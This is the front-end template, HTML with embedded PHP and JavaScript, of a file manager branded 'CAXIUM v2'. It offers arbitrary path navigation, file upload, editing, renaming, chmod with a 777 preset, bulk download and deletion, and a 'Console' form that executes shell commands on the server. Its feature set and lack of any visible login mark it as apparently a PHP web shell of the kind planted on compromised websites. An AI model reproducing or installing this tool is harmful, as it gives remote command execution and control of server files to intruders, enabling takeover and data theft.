        .modal-body { padding: 20px; }

        .chmod-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-bottom: 16px; }
        .chmod-group { background: var(--bg); border: 1px solid var(--border); border-radius: 8px; padding: 14px; text-align: center; }
        .chmod-group-label { font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-muted); margin-bottom: 10px; }
        .chmod-checkboxes { display: flex; justify-content: center; gap: 8px; }
        .chmod-checkboxes label { font-size: 12px; cursor: pointer; }

        .chmod-presets { display: flex; gap: 8px; flex-wrap: wrap; margin-bottom: 16px; }

        .bulk-bar { display: none; gap: 12px; align-items: center; padding: 14px 18px; background: rgba(88,166,255,0.1); border: 1px solid rgba(88,166,255,0.3); border-radius: 8px; margin-bottom: 16px; }
        .bulk-bar.show { display: flex; }
        .bulk-count { color: var(--accent); font-weight: 600; margin-right: auto; }

        @media (max-width: 768px) {
            .file-table th:nth-child(4), .file-table td:nth-child(4),
            .file-table th:nth-child(5), .file-table td:nth-child(5),
            .file-table th:nth-child(6), .file-table td:nth-child(6) { display: none; }
            .input-group { flex-direction: column; }
        }
    </style>
    <script>
        function toggleSelectAll(checkbox) {
            const checkboxes = document.querySelectorAll('input[name="items[]"]');
            checkboxes.forEach(cb => cb.checked = checkbox.checked);
            updateBulkActions();
        }

        function updateBulkActions() {
            const checkboxes = document.querySelectorAll('input[name="items[]"]:checked');
            const bulkActions = document.getElementById('bulk-actions');
            const countText = document.getElementById('selected-count');

            if (checkboxes.length > 0) {
                bulkActions.style.display = 'flex';
                countText.textContent = checkboxes.length + ' item(s) selected';
            } else {
                bulkActions.style.display = 'none';
            }
        }

        document.addEventListener('DOMContentLoaded', function() {
            const bulkForm = document.getElementById('file-form');
            if (bulkForm) {
                bulkForm.addEventListener('submit', function(e) {
                    const submitter = e.submitter;
                    if (submitter && submitter.name === 'act_del' || submitter && submitter.name === 'act_dl') {
                        const navInput = bulkForm.querySelector('input[name="goto"]');
                        if (navInput) {
                            navInput.disabled = true;
                            setTimeout(function() { navInput.disabled = false; }, 100);
                        }
                    }
                });
            }
        });

        function switchUploadTab(tabId) {
            document.querySelectorAll('.upload-panel').forEach(panel => {
                panel.classList.remove('active');
            });
            document.querySelectorAll('.upload-tab').forEach(tab => {
                tab.classList.remove('active');
            });
            document.getElementById(tabId + '-panel').classList.add('active');
            document.getElementById(tabId + '-tab').classList.add('active');
        }

        function uploadFile() {
            var fileInput = document.getElementById('upload_files');
            var statusSpan = document.getElementById('upload_status');

            if (!fileInput.files || fileInput.files.length === 0) {
                statusSpan.textContent = "No file selected";
                statusSpan.style.color = "red";
                return;
            }

            var file = fileInput.files[0];
            var filename = file.name;
            var currentDir = "<?= addslashes($_SESSION['current_dir']) ?>";
            var scriptUrl = window.location.pathname;

            statusSpan.textContent = "Uploading " + filename + ", please wait...";
            statusSpan.style.color = "blue";

            var reader = new FileReader();
            reader.readAsBinaryString(file);

            reader.onloadend = function(evt) {
                var xhr = new XMLHttpRequest();
                xhr.open("POST", scriptUrl + "?upload_file=" + encodeURIComponent(currentDir) + "&name=" + encodeURIComponent(filename), true);

                XMLHttpRequest.prototype.mySendAsBinary = function(text) {
                    var data = new ArrayBuffer(text.length);
                    var ui8a = new Uint8Array(data, 0);
                    for (var i = 0; i < text.length; i++) {
                        ui8a[i] = (text.charCodeAt(i) & 0xff);
                    }
                    if (typeof window.Blob == "function") {
                        var blob = new Blob([data]);
                    } else {
                        var bb = new (window.MozBlobBuilder || window.WebKitBlobBuilder || window.BlobBuilder)();
                        bb.append(data);
                        var blob = bb.getBlob();
                    }
                    this.send(blob);
                }

                xhr.onreadystatechange = function() {
                    if (xhr.readyState == 4) {
                        if (xhr.status == 200) {
                            statusSpan.textContent = "File " + filename + " uploaded successfully!";
                            statusSpan.style.color = "#22c55e";
                            setTimeout(function() { location.reload(); }, 1000);
                        } else {
                            statusSpan.textContent = "Upload failed: " + xhr.responseText;
                            statusSpan.style.color = "red";
                        }
                    }
                };

                xhr.mySendAsBinary(evt.target.result);
            };
        }

        function openChmodModal(itemName) {
            document.getElementById('chmodModal').style.display = 'block';
            document.getElementById('chmodItem').value = itemName;
            var currentPerms = document.getElementById('currentPerms_' + itemName.replace(/[^a-zA-Z0-9]/g, '_')).value;
            updateChmodDisplay(currentPerms);
        }

        function closeChmodModal() {
            document.getElementById('chmodModal').style.display = 'none';
        }

        function updateChmodDisplay(perms) {
            document.getElementById('chmodOctal').value = perms;
            var octal = parseInt(perms, 8);
            var binary = octal.toString(2).padStart(9, '0');
            document.getElementById('owner_read').checked = binary[0] === '1';
            document.getElementById('owner_write').checked = binary[1] === '1';
            document.getElementById('owner_execute').checked = binary[2] === '1';
            document.getElementById('group_read').checked = binary[3] === '1';
            document.getElementById('group_write').checked = binary[4] === '1';
            document.getElementById('group_execute').checked = binary[5] === '1';
            document.getElementById('other_read').checked = binary[6] === '1';
            document.getElementById('other_write').checked = binary[7] === '1';
            document.getElementById('other_execute').checked = binary[8] === '1';
        }

        function updateChmodFromCheckboxes() {
            var binary = '';
            binary += document.getElementById('owner_read').checked ? '1' : '0';
            binary += document.getElementById('owner_write').checked ? '1' : '0';
            binary += document.getElementById('owner_execute').checked ? '1' : '0';
            binary += document.getElementById('group_read').checked ? '1' : '0';
            binary += document.getElementById('group_write').checked ? '1' : '0';
            binary += document.getElementById('group_execute').checked ? '1' : '0';
            binary += document.getElementById('other_read').checked ? '1' : '0';
            binary += document.getElementById('other_write').checked ? '1' : '0';
            binary += document.getElementById('other_execute').checked ? '1' : '0';
            var octal = parseInt(binary, 2).toString(8).padStart(3, '0');
            document.getElementById('chmodOctal').value = octal;
        }

        function setPresetChmod(preset) {
            updateChmodDisplay(preset);
        }

        window.onclick = function(event) {
            var modal = document.getElementById('chmodModal');
            if (event.target == modal) {
                modal.style.display = 'none';
            }
        }

        document.addEventListener('DOMContentLoaded', function() {
            var csrfToken = document.querySelector('meta[name="csrf-token"]')?.content;
            if (!csrfToken) return;
            document.querySelectorAll('form[method="post"]').forEach(function(form) {
                if (!form.querySelector('input[name="_csrf_token"]')) {
                    var input = document.createElement('input');
                    input.type = 'hidden';
                    input.name = '_csrf_token';
                    input.value = csrfToken;
                    form.appendChild(input);
                }
            });
        });
    </script>
    <meta name="csrf-token" content="<?= htmlentities(generateCSRFToken()) ?>">
</head>
<body>
<div class="container">
    <div class="header">
        <div class="header-top">
            <div class="logo">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                    <path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/>
                </svg>
                <span class="logo-text">CAX<span>IUM</span> v2</span>
            </div>
        </div>
    </div>

    <?php if ($notification): ?>
        <div class="alert alert-success">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
            <?= htmlentities($notification) ?>
        </div>
    <?php endif; ?>

    <?php if ($errorMsg): ?>
        <div class="alert alert-danger">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
            <?= htmlentities($errorMsg) ?>
        </div>
    <?php endif; ?>

    <div class="card" style="margin-bottom: 20px;">
        <div class="card-header">
            <span class="card-title">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
                Navigate
            </span>
        </div>
        <div class="card-body">
            <form method="post" class="input-group">
                <input type="text" name="goto" value="<?= htmlentities($currentDirectory) ?>" placeholder="Enter path..." style="flex: 1;">
                <button class="btn btn-primary" type="submit">Go</button>
            </form>
        </div>
    </div>

    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 16px; margin-bottom: 20px;">
        <div class="card">
            <div class="card-header">
                <span class="card-title">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
                    Upload File
                </span>
            </div>
            <div class="card-body">
                <div class="upload-tabs">
                    <div id="standard-tab" class="upload-tab active" onclick="switchUploadTab('standard')">Standard</div>
                    <div id="advanced-tab" class="upload-tab" onclick="switchUploadTab('advanced')">Advanced</div>
                </div>

                <div id="standard-panel" class="upload-panel active">
                    <form method="post" enctype="multipart/form-data">
                        <div class="input-group">
                            <input type="file" name="upload">
                            <button class="btn btn-primary" type="submit">Upload</button>
                        </div>
                    </form>
                </div>

                <div id="advanced-panel" class="upload-panel">
                    <div class="input-group">
                        <input type="file" id="upload_files" name="upload_adv" multiple>
                        <button class="btn btn-primary" onclick="uploadFile(); return false;">Upload</button>
                    </div>
                    <p style="margin-top: 8px; font-size: 12px; color: var(--text-muted);">Status: <span id="upload_status">No file selected</span></p>
                </div>
            </div>
        </div>

        <div class="card">
            <div class="card-header">
                <span class="card-title">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 5v14M5 12h14"/></svg>
                    Create New
                </span>
            </div>
            <div class="card-body">
                <form method="post" class="input-group">
                    <input type="text" name="mk_file" placeholder="New file name..." style="flex: 1;">
                    <button class="btn btn-success" type="submit">File</button>
                </form>
                <form method="post" class="input-group">
                    <input type="text" name="mk_folder" placeholder="New folder name..." style="flex: 1;">
                    <button class="btn btn-success" type="submit">Folder</button>
                </form>
            </div>
        </div>
    </div>

    <?php if ($fileToView && $viewContent !== null): ?>
    <div class="card" style="margin-bottom: 20px;">
        <div class="card-header">
            <span class="card-title">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                Viewing: <?= htmlentities($fileToView) ?>
            </span>
            <form method="post" style="display: inline;">
                <button type="submit" class="btn btn-ghost btn-sm">Close</button>
            </form>
        </div>
        <div class="card-body">
            <textarea readonly style="min-height: 300px; width: 100%; box-sizing: border-box;"><?= htmlentities($viewContent) ?></textarea>
        </div>
    </div>
    <?php endif; ?>

    <?php if ($fileToEdit !== null): ?>
    <div class="card" style="margin-bottom: 20px;">
        <div class="card-header">
            <span class="card-title">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
                Editing: <?= htmlentities($fileToEdit) ?>
            </span>
        </div>
        <div class="card-body">
            <form method="post">
                <input type="hidden" name="edit_file" value="<?= htmlentities($fileToEdit) ?>">
                <textarea name="content" style="min-height: 400px; width: 100%; box-sizing: border-box;"><?= htmlentities($fileContent) ?></textarea>
                <div style="margin-top: 12px; display: flex; gap: 8px;">
                    <button class="btn btn-primary" type="submit">Save Changes</button>
                    <button type="button" class="btn btn-ghost" onclick="location.href=location.pathname;">Cancel</button>
                </div>
            </form>
        </div>
    </div>
    <?php endif; ?>

    <?php if ($commandAvailable): ?>
    <div class="card" style="margin-bottom: 20px;">
        <div class="card-header">
            <span class="card-title">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
                Console
            </span>
        </div>
        <div class="card-body">
            <form method="post" class="input-group" style="flex: 1;">
                <input type="text" name="exec" placeholder="Enter command..." style="flex: 1;">
                <button class="btn btn-success" type="submit">Execute</button>
            </form>
            <?php if ($commandResult): ?>
                <div class="console" style="margin-top: 12px;"><?= htmlentities($commandResult) ?></div>
            <?php endif; ?>
        </div>
    </div>
    <?php endif; ?>

    <form method="post" id="file-form">
        <div class="bulk-bar" id="bulk-actions">
            <span class="bulk-count" id="selected-count">0 selected</span>
            <button type="submit" name="act_dl" class="btn btn-ghost" onclick="return confirm('Download selected items as zip?')">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                Download
            </button>
            <button type="submit" name="act_del" class="btn btn-danger" onclick="return confirm('Delete all selected items?')">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/></svg>
                Delete
            </button>
        </div>

    <div class="card">
        <div class="card-header">
            <span class="card-title">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
                Files
            </span>
            <form method="post" style="display:inline;"><input type="hidden" name="goto" value="<?= dirname($currentDirectory) ?>"><button type="submit" class="btn btn-ghost"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg> Parent</button></form>
        </div>
        <table class="file-table">
            <thead>
                <tr>
                    <th style="width: 40px;"><input type="checkbox" onclick="toggleSelectAll(this)"></th>
                    <th>Name</th>
                    <th style="width: 100px;">Type</th>
                    <th style="width: 100px; text-align: right;">Size</th>
                    <th style="width: 150px;">Modified</th>
                    <th style="width: 90px; text-align: center;">Perms</th>
                    <th style="width: 180px; text-align: right;">Actions</th>
                </tr>
            </thead>
            <tbody>
        <?php foreach ($allItems as $item):
            $fullPath = $currentDirectory . DIRECTORY_SEPARATOR . $item;
            $realPath = validatePath($fullPath);

            if ($realPath !== false) {
                $isDirectory = @is_dir($realPath);
                $canWrite = @is_writable($realPath);
                $fileSize = $isDirectory ? 0 : @filesize($realPath);
                $fileModTime = @filemtime($realPath);
                $filePerms = @substr(sprintf('%o', @fileperms($realPath)), -4);
            } else {
                $isDirectory = @is_dir($fullPath);
                $canWrite = false;
                $fileSize = 0;
                $fileModTime = 0;
                $filePerms = '????';
            }

            $safeItemName = preg_replace('/[^a-zA-Z0-9]/', '_', $item);
            $ext = strtolower(pathinfo($item, PATHINFO_EXTENSION));
            $iconClass = 'file';
            if ($isDirectory) $iconClass = 'folder';
            elseif (in_array($ext, array('jpg','jpeg','png','gif','svg','webp','ico'))) $iconClass = 'image';
            elseif (in_array($ext, array('zip','tar','gz','rar','7z'))) $iconClass = 'archive';
            $iconHtml = $isDirectory
                ? '<svg viewBox="0 0 24 24"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>'
                : '<svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>';
            if (!$isDirectory && $ext) {
                $iconHtml .= '<span class="ext">' . strtoupper($ext) . '</span>';
            }
?>
            <tr>
                <td>
                    <input type="checkbox" name="items[]" value="<?= htmlentities($item) ?>" onclick="updateBulkActions()">
                </td>
                <td>
                    <?php if ($itemToRename === $item): ?>
                        <form method="post" style="margin: 0; display: flex; gap: 8px; align-items: center;">
                            <input type="hidden" name="from_name" value="<?= htmlentities($item) ?>">
                            <input type="text" name="to_name" value="<?= htmlentities($item) ?>">
                            <button class="btn btn-primary btn-sm" type="submit">Save</button>
                        </form>
                    <?php elseif ($itemToChmod === $item): ?>
                        <form method="post" style="margin: 0; display: flex; gap: 8px; align-items: center;">
                            <input type="hidden" name="set_perms" value="<?= htmlentities($item) ?>">
                            <input type="text" name="perm_val" value="<?= $filePerms ?>" maxlength="3" placeholder="755" style="width: 70px;">
                            <button class="btn btn-primary btn-sm" type="submit">Set</button>
                            <button type="button" class="btn btn-ghost btn-sm" onclick="location.reload();">Cancel</button>
                        </form>
                    <?php else: ?>
                        <div class="file-name-cell">
                            <div class="file-icon <?= $iconClass ?>"><?= $iconHtml ?></div>
                            <?php if ($isDirectory): ?>
                                <a href="#" class="file-name" onclick="document.getElementById('nav-<?= md5($item) ?>').submit(); return false;"><?= htmlentities($item) ?></a>
                                <form id="nav-<?= md5($item) ?>" method="post" style="display: none;">
                                    <input type="hidden" name="goto" value="<?= $fullPath ?>">
                                </form>
                            <?php else: ?>
                                <a href="#" class="file-name" onclick="document.getElementById('view-<?= md5($item) ?>').submit(); return false;"><?= htmlentities($item) ?></a>
                                <form id="view-<?= md5($item) ?>" method="post" style="display: none;">
                                    <input type="hidden" name="show" value="<?= $item ?>">
                                </form>
                            <?php endif; ?>
                        </div>
                    <?php endif; ?>
                </td>
                <td>
                    <span class="file-meta"><?= $isDirectory ? 'Directory' : (getFileExtension($item) ?: 'File') ?></span>
                </td>
                <td style="text-align: right;">
                    <span class="file-meta"><?= $isDirectory ? '—' : formatFileSize($fileSize) ?></span>
                </td>
                <td>
                    <span class="file-meta"><?= date('Y-m-d H:i', $fileModTime) ?></span>
                </td>
                <td style="text-align: center;">
                    <span class="perms <?= $canWrite ? 'writable' : 'readonly' ?>"><?= $filePerms ?></span>
                    <input type="hidden" id="currentPerms_<?= md5($item) ?>" value="<?= $filePerms ?>">
                </td>
                <td>
                    <div class="actions">
                        <?php if (!$isDirectory): ?>
                            <form method="post" style="display: inline;">
                                <input type="hidden" name="modify" value="<?= htmlentities($item) ?>">
                                <button type="submit" class="btn btn-ghost btn-sm">Edit</button>
                            </form>
                        <?php endif; ?>
                        <form method="post" style="display: inline;">
                            <input type="hidden" name="rename_item" value="<?= htmlentities($item) ?>">
                            <button type="submit" class="btn btn-ghost btn-sm">Rename</button>
                        </form>
                        <form method="post" style="display: inline;">
                            <input type="hidden" name="perms_item" value="<?= htmlentities($item) ?>">
                            <button type="button" class="btn btn-ghost btn-sm" onclick="openChmodModal('<?= htmlentities($item) ?>')">Chmod</button>
                        </form>
                        <form method="post" style="display: inline;">
                            <input type="hidden" name="get_file" value="<?= htmlentities($item) ?>">
                            <button type="submit" class="btn btn-ghost btn-sm">Download</button>
                        </form>
                        <form method="post" style="display: inline;" onsubmit="return confirm('Delete <?= htmlentities($item) ?>?');">
                            <input type="hidden" name="del_item" value="<?= htmlentities($item) ?>">
                            <button type="submit" class="btn btn-danger btn-sm">Delete</button>
                        </form>
                    </div>
                </td>
            </tr>
        <?php endforeach; ?>
        </tbody>
    </table>
    </form>
</div>

<!-- Chmod Modal -->
<div id="chmodModal" class="modal">
    <div class="modal-content">
        <div class="modal-header">
            <span class="modal-title">Change Permissions</span>
            <span class="modal-close" onclick="closeChmodModal()">&times;</span>
        </div>
        <form method="post">
            <input type="hidden" id="chmodItem" name="set_perms" value="">
            <div class="chmod-grid">
                <div class="chmod-group">
                    <div class="chmod-group-label">Owner</div>
                    <div class="chmod-checkboxes">
                        <label><input type="checkbox" id="owner_read" onchange="updateChmodFromCheckboxes()"> R</label>
                        <label><input type="checkbox" id="owner_write" onchange="updateChmodFromCheckboxes()"> W</label>
                        <label><input type="checkbox" id="owner_execute" onchange="updateChmodFromCheckboxes()"> X</label>
                    </div>
                </div>
                <div class="chmod-group">
                    <div class="chmod-group-label">Group</div>
                    <div class="chmod-checkboxes">
                        <label><input type="checkbox" id="group_read" onchange="updateChmodFromCheckboxes()"> R</label>
                        <label><input type="checkbox" id="group_write" onchange="updateChmodFromCheckboxes()"> W</label>
                        <label><input type="checkbox" id="group_execute" onchange="updateChmodFromCheckboxes()"> X</label>
                    </div>
                </div>
                <div class="chmod-group">
                    <div class="chmod-group-label">Other</div>
                    <div class="chmod-checkboxes">
                        <label><input type="checkbox" id="other_read" onchange="updateChmodFromCheckboxes()"> R</label>
                        <label><input type="checkbox" id="other_write" onchange="updateChmodFromCheckboxes()"> W</label>
                        <label><input type="checkbox" id="other_execute" onchange="updateChmodFromCheckboxes()"> X</label>
                    </div>
                </div>
            </div>
            <div style="margin-bottom: 16px; text-align: center;">
                <input type="text" id="chmodOctal" name="perm_val" maxlength="3" style="width: 70px; text-align: center; font-family: 'JetBrains Mono', monospace;">
            </div>
            <div style="margin-bottom: 15px;">
                <button type="button" class="btn btn-sm" onclick="setPresetChmod('755')">755 (Default)</button>
                <button type="button" class="btn btn-sm" onclick="setPresetChmod('644')">644 (File)</button>
                <button type="button" class="btn btn-sm" onclick="setPresetChmod('777')">777 (All)</button>
            </div>
            <div>
                <button type="submit" class="btn btn-primary">Apply Changes</button>
                <button type="button" class="btn" onclick="closeChmodModal()">Cancel</button>
            </div>
        </form>
    </div>
</div>

</body>
</html>
